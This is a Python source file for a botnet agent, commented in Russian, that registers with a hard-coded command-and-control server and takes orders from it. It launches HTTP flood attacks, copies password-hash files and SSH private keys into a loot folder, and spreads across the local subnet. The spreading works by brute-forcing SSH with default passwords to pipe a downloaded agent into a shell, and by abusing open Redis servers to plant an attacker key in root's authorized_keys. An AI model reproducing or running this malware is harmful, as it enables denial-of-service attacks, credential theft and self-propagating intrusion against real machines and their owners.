#!/usr/bin/env python3
# AVZ-Aristo Agent v25.7 – выполняет команды, самораспространение в локальной сети
import socket, json, time, os, platform, subprocess, threading, ipaddress

C2_HOST = "80.249.146.202"
C2_PORT = 80
TOKEN = "AVZ-ARISTO-SECRET-KEY-2025"

def get_system_info():
    try:
        import psutil
        hostname = platform.node()
        os_info = f"{platform.system()} {platform.release()}"
        cpu = f"{psutil.cpu_count()} cores"
        ram = f"{round(psutil.virtual_memory().total / (1024**3), 1)} GB"
    except:
        hostname = platform.node()
        os_info = platform.system()
        cpu = "unknown"
        ram = "unknown"
    return {"hostname": hostname, "os": os_info, "cpu": cpu, "ram": ram}

def register():
    info = get_system_info()
    try:
        s = socket.socket(); s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(json.dumps(info).encode())
        s.recv(4096); s.close()
        return True
    except Exception as e:
        print(f"Reg failed: {e}")
        return False

def get_commands():
    try:
        s = socket.socket(); s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(b"ping")
        resp = s.recv(4096); s.close()
        if resp and resp != b"no commands":
            return json.loads(resp)
    except:
        pass
    return []

def execute_attack(cmd):
    target = cmd.get("target")
    method = cmd.get("method", "GET")
    threads = cmd.get("threads", 100)
    print(f"[attack] {target} {method} {threads}")
    def flood():
        import requests
        for _ in range(threads):
            try:
                if method == "GET":
                    requests.get(target, timeout=2)
                elif method == "POST":
                    requests.post(target, data={"data": "flood"}, timeout=2)
                elif method == "CFB":
                    requests.get(target, headers={"User-Agent": "Mozilla/5.0", "Cache-Control": "no-cache"}, timeout=2)
            except:
                pass
    threading.Thread(target=flood, daemon=True).start()

def execute_grab():
    print("[grab] collecting...")
    import glob, shutil
    loot_dir = "loot"
    os.makedirs(loot_dir, exist_ok=True)
    for pattern in ["/etc/passwd", "/etc/shadow", "/var/log/auth.log", "~/.ssh/id_rsa"]:
        for f in glob.glob(pattern):
            if os.path.exists(f):
                shutil.copy(f, loot_dir)

def spread_to_local_network():
    """Заражает другие устройства в своей /24 подсети простыми методами."""
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except:
        return
    network = str(ipaddress.IPv4Interface(f"{local_ip}/24").network)
    print(f"[spread] сканирую {network}")
    # Используем упрощённый спредер (импортируем функции из spreader.py, если они доступны)
    # Здесь заглушка — запускаем простой SSH/Telnet брутфорс в потоках
    def probe_and_infect(ip):
        import subprocess, socket
        # пробуем SSH ключом (если есть) или дефолтные пароли
        for port in [22, 23, 80, 443, 2375, 6379]:
            try:
                s = socket.socket()
                s.settimeout(0.3)
                s.connect((ip, port))
                s.close()
                if port == 22:
                    subprocess.call(f"sshpass -p 'admin' ssh -o StrictHostKeyChecking=no root@{ip} 'wget -O- {AGENT_URL} | sh'", shell=True, timeout=3)
                elif port == 6379:
                    import redis
                    r = redis.Redis(host=ip, port=6379, socket_timeout=1)
                    r.ping()
                    r.set('crackit', '\n\nssh-rsa AAAAB3N...\n\n')
                    r.config_set('dir', '/root/.ssh')
                    r.config_set('dbfilename', 'authorized_keys')
                    r.save()
                # другие порты можно добавить
            except:
                pass
    threads = []
    for host in ipaddress.IPv4Network(network).hosts():
        ip = str(host)
        t = threading.Thread(target=probe_and_infect, args=(ip,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def main_loop():
    # Запускаем самораспространение в фоне
    threading.Thread(target=spread_to_local_network, daemon=True).start()
    while True:
        try:
            cmds = get_commands()
            for cmd in cmds:
                t = cmd.get("type")
                if t == "attack":
                    execute_attack(cmd)
                elif t == "grab":
                    execute_grab()
                elif t == "stop":
                    print("[stop] received")
            time.sleep(5)
        except Exception as e:
            print(f"Loop error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    if register():
        main_loop()
